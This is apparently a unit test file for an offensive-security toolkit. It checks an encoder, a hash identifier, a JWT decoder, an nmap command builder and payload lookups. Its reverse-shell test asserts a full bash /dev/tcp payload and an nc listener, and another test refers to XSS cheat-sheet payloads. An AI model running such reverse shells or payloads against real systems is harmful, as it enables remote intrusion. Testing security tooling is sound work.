// Headless check of the sealed core's pure functions.
const fs = require('fs');
const src = fs.readFileSync(__dirname + '/SEALED-CORE.js', 'utf8');
global.window = {};
new Function('window', src.replace('})(window);', '})(window);'))(global.window);
const TK = global.window.TK;

let pass = 0, fail = 0;
function ok(name, cond, got) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + '  -> ' + JSON.stringify(got)); }
}

console.log('\n[codec]');
let r = TK.run('codec', 'b64enc', { input: 'hello' });
ok('b64 encode', r.out.result === 'aGVsbG8=', r.out.result);
r = TK.run('codec', 'b64dec', { input: 'aGVsbG8=' });
ok('b64 decode', r.out.result === 'hello', r.out.result);
r = TK.run('codec', 'b64enc', { input: 'héllo ☃ 日本' });
const round = TK.run('codec', 'b64dec', { input: r.out.result });
ok('utf8 roundtrip', round.out.result === 'héllo ☃ 日本', round.out.result);
r = TK.run('codec', 'urlenc', { input: 'a b&c=d' });
ok('url encode', r.out.result === 'a%20b%26c%3Dd', r.out.result);
r = TK.run('codec', 'urldec', { input: 'a%20b%26c%3Dd' });
ok('url decode', r.out.result === 'a b&c=d', r.out.result);
r = TK.run('codec', 'hexenc', { input: 'AB' });
ok('hex encode', r.out.result === '4142', r.out.result);
r = TK.run('codec', 'hexdec', { input: '4142' });
ok('hex decode', r.out.result === 'AB', r.out.result);
r = TK.run('codec', 'rot13', { input: 'Hello' });
ok('rot13', r.out.result === 'Uryyb', r.out.result);
r = TK.run('codec', 'b64dec', { input: '!!!notb64' });
ok('bad input -> ERR note', /^ERR:/.test(r.note), r.note);

console.log('\n[hashid]');
r = TK.run('hashid', 'id', { hash: '5f4dcc3b5aa765d61d8327deb882cf99' });
ok('32 hex -> MD5', /MD5/.test(r.out.result), r.out.result);
r = TK.run('hashid', 'id', { hash: 'a'.repeat(64) });
ok('64 hex -> SHA-256', /SHA-256/.test(r.out.result), r.out.result);
r = TK.run('hashid', 'id', { hash: '$6$rounds=5000$abc$' + 'x'.repeat(86) });
ok('$6$ -> sha512crypt', /sha512crypt/.test(r.out.result), r.out.result);
r = TK.run('hashid', 'id', { hash: '$2b$12$' + 'a'.repeat(53) });
ok('$2b$ -> bcrypt', /bcrypt/.test(r.out.result), r.out.result);
r = TK.run('hashid', 'id', { hash: 'hello world' });
ok('junk -> not recognised', /not a recognised/.test(r.out.result), r.out.result);

console.log('\n[jwt]');
const tok = [
  Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url'),
  Buffer.from(JSON.stringify({ sub: '1234', name: 'globbs', iat: 1700000000, exp: 1700003600 })).toString('base64url'),
  'sig_placeholder'
].join('.');
r = TK.run('jwt', 'decode', { token: tok });
ok('jwt payload parsed', /"sub": "1234"/.test(r.out.result), r.out.result.slice(0, 80));
ok('jwt exp shown', /exp\s+20/.test(r.out.result), r.out.result.split('\n').filter(l => /exp/.test(l))[0]);
ok('jwt alg shown', /alg: HS256/.test(r.out.result), 'alg');
r = TK.run('jwt', 'decode', { token: 'notatoken' });
ok('jwt junk -> ERR', /^ERR:/.test(r.note), r.note);

console.log('\n[nmap]');
r = TK.run('nmap', 'build', { target: '10.0.0.5', scantype: 'connect', timing: '4', svc: true, scripts: false, ports: '22,80,443' });
ok('connect build', /^nmap -n -sT -sV -T4 -p 22,80,443 10\.0\.0\.5$/.test(r.out.result), r.out.result);
r = TK.run('nmap', 'build', { target: '10.0.0.5', scantype: 'syn' });
ok('syn warns root', /needs root/.test(r.note), r.note);
ok('syn includes -sS', /-sS/.test(r.out.result), r.out.result);
r = TK.run('nmap', 'build', { target: '' });
ok('no target -> ERR', /^ERR:/.test(r.note), r.note);

console.log('\n[rev]');
r = TK.run('rev', 'gen', { ip: '10.0.0.9', port: '9001', shell: 'bash' });
ok('bash payload', r.out.result === 'bash -i >& /dev/tcp/10.0.0.9/9001 0>&1', r.out.result);
ok('listener', r.out.listener === 'nc -lvnp 9001', r.out.listener);
r = TK.run('rev', 'gen', { ip: '', port: '9001' });
ok('no host -> ERR', /^ERR:/.test(r.note), r.note);

console.log('\n[ports/cribs]');
r = TK.run('ports', 'look', { q: 'smb' });
ok('port filter smb', /445/.test(r.out.result) && !/3306/.test(r.out.result), r.out.result.slice(0, 60));
r = TK.run('ports', 'look', { q: '' });
ok('all ports listed', r.note === '40 of 40', r.note);
r = TK.run('crib', 'look', { q: 'xss' });
ok('crib filter', /alert\(1\)/.test(r.out.result) && !/SLEEP/.test(r.out.result), r.out.result.slice(0, 60));

console.log(`\n${pass} passed, ${fail} failed\n`);
process.exit(fail ? 1 : 0);
